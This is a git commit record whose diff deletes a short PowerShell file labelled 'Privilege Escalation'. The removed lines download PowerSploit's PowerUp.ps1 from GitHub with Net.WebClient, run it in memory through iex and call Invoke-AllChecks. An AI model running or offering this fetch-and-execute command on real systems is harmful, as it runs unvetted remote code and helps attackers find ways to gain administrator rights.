9ac5c4ceb69203a6f8cd4119fef5d7be719b3052
Phil025 <111816736+Phil025@users.noreply.github.com>
2025-03-03 09:16:42 -0500

    Delete PowerUp.ps1

--- PowerUp.ps1
+++
@@ -1,5 +0,0 @@
-#Run in powershell (run as admin)
-#Privilege Escalation
-
-iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
-Invoke-AllChecks
